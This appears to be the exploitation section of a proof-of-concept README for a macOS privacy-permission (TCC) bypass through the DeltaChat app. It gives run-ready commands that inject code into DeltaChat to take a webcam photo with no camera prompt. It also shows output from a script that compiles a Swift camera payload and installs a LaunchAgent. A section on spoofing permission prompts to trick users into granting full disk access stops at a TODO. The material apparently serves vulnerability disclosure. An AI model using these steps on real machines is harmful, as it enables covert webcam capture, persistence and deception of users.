# Exploitation

Showing a few ways to exploit this vulnerability, also showing a "new" vulnerability/technique with TCC that _can_ be useful for tricking a user for more TCC rights, e.g. full disk access or any other TCC rights. 

>**Note:** When running this proof-of-concept, the Terminal app does not need a prompt for camera access. This is because the camera permission is granted to DeltaChat, and the injected code inherits those permissions, effectively bypassing macOS TCC restrictions.

### Automated 

Run the following from Terminal using [electroniz3r](https://github.com/r3ggi/electroniz3r)

```sh
electroniz3r inject /Applications/DeltaChat.app/ --predefined-script takeSelfie
```

Sample output:
```sh
/Applications/DeltaChat.app/ started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/56264727-4473-4393-b712-7e24c65a1c71
Check /tmp/selfie.jpg
```

Confirm the result by running:
```sh
open /tmp/selfie.jpg
```

A picture is taken using the system webcam, without Terminal having any camera access this demonstrates a successful TCC bypass.

### Manual 

Clone the repository and then execute the bash script, the bash script autoexploits the TCC Bypass, creating a selfie without triggering a new TCC prompt.
```sh
bash deltachat_camera_bypass.sh
# or
chmod +x deltachat_camera_bypass.sh && ./deltachat_camera_bypass.sh
```

Example output:
```sh
kunpeeks@MacBook-Pro-van-Kun 1 % ./deltachat_camera_bypass.sh
[*] Step 1: Write Swift camera payload to /tmp/selfie_payload.swift
[*] Step 2: Compile Swift payload to /Users/kunpeeks/Desktop/selfie
[*] Step 3: Create LaunchAgent plist at /Users/kunpeeks/Library/LaunchAgents/com.deltachat.tcc.camera.plist
[*] Step 4: Load LaunchAgent and trigger DeltaChat
[*] Waiting 5 seconds for selfie to complete...
[*] Checking selfie result:
[+] Selfie saved at /tmp/selfie.jpg
```


### Prompt Spoofing

This payload triggers a macOS TCC prompt for disk access. But instead of showing the request as coming from the Terminal (which executed the code), the system displays:

TODO: xxx
